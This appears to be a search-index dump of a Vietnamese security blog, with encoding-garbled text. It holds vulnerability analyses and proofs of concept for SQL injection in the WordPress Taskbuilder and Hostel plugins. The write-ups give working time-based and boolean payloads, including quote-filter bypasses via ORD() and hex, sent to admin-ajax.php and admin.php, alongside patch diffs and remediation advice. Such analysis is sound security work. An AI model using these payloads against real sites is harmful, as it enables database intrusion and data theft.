d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi 